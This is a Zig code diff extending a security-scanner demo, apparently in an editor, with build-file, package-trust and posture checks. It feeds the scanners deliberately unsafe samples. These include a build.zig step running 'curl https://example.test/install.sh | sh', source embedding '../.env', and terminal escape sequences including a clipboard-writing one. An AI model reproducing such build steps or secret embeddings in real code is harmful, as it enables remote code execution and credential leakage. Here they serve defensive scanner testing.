@@ -15,6 +15,10 @@ const document_store = @import("../editor/store.zig");
 const modes = @import("../language/modes.zig");
 const literal = @import("../search/literal.zig");
 const build_consent = @import("../security/build_consent.zig");
+const build_firewall = @import("../security/build_firewall.zig");
+const security_findings = @import("../security/findings.zig");
+const package_trust = @import("../security/package_trust.zig");
+const posture = @import("../security/posture.zig");
 const sanitizer = @import("../security/output_sanitizer.zig");
 const zig_security = @import("../security/zig_scanner.zig");
 const terminal_renderer = @import("../terminal/renderer.zig");
@@ -88,22 +92,55 @@ fn architectureDemo(stdout: anytype) !void {
 
 fn securityDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
     const source =
+        \\const c = @cImport({});
         \\extern fn c_read(buf: [*]u8, len: usize) c_int;
         \\
         \\pub fn main() void {
+        \\    const allocator = std.heap.c_allocator;
         \\    const token = @embedFile("../.env");
         \\    @setRuntimeSafety(false);
         \\    const p = @ptrCast(raw);
         \\    const x = parse() catch unreachable;
+        \\    _ = allocator;
         \\    _ = token;
         \\    _ = p;
         \\    _ = x;
         \\}
         \\
     ;
+    const build_source =
+        \\const std = @import("std");
+        \\pub fn build(b: *std.Build) void {
+        \\    _ = b.addSystemCommand(&.{ "sh", "-c", "curl https://example.test/install.sh | sh" });
+        \\    const generated = b.addWriteFiles();
+        \\    _ = generated;
+        \\    _ = b.dependency("netlib", .{});
+        \\}
+        \\
+    ;
+    const zon_source =
+        \\.{
+        \\  .name = .demo,
+        \\  .dependencies = .{
+        \\    .netlib = .{
+        \\      .url = "https://example.test/netlib.tar.gz",
+        \\    },
+        \\    .local = .{
+        \\      .path = "../vendor/local",
+        \\    },
+        \\  },
+        \\}
+        \\
+    ;
 
     var collection = try zig_security.scanSource(allocator, source, .{ .path = "demo.zig" });
     defer collection.deinit();
+    var build_findings = try build_firewall.scanBuildZig(allocator, build_source, .{});
+    defer build_findings.deinit();
+    try appendFindings(&collection, &build_findings);
+    var package_findings = try package_trust.scanZon(allocator, zon_source, .{});
+    defer package_findings.deinit();
+    try appendFindings(&collection, &package_findings);
 
     var sanitized = try sanitizer.sanitizeAlloc(allocator, "build ok\x1b[2J hidden? \x1b]52;c;AAAA\x07done\n");
     defer sanitized.deinit(allocator);
@@ -127,6 +164,18 @@ fn securityDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
         collection.items.items.len,
         collection.countRiskAtLeast(.high),
     });
+    const summary = posture.summarize(&collection, .untrusted);
+    try stdout.print("posture: {s}, recommended trust: {s}\n", .{
+        summary.label,
+        @tagName(summary.recommended_trust),
+    });
+    try stdout.print("boundaries: build={d}, package={d}, ffi={d}, secret={d}, allocator={d}\n", .{
+        summary.build_firewall,
+        summary.package_trust,
+        summary.ffi_boundary,
+        summary.secret_flow,
+        summary.allocator_policy,
+    });
     try stdout.print("output sanitizer: stripped {d} control sequence(s)\n\n", .{sanitized.stats.total()});
 
     for (collection.items.items) |item| {
@@ -139,6 +188,12 @@ fn securityDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
             item.message,
         });
         try stdout.print("  {s}\n", .{item.evidence});
+    }
+}
+
+fn appendFindings(target: *security_findings.Collection, source: *const security_findings.Collection) !void {
+    for (source.items.items) |item| {
+        try target.appendFinding(item);
     }
 }
 
@@ -173,8 +228,9 @@ fn screenDemo(allocator: std.mem.Allocator, stdout: anytype) !void {
         \\
     );
     _ = try dispatcher.dispatch(&app, .{ .id = "security.scan_current" });
+    _ = try dispatcher.dispatch(&app, .{ .id = "zig.build" });
     try app.palette.open();
-    try app.palette.setQuery("zig");
+    try app.palette.setQuery("security");
 
     var screen = try tui.renderApp(allocator, &app, 80, 22);
     defer screen.deinit();
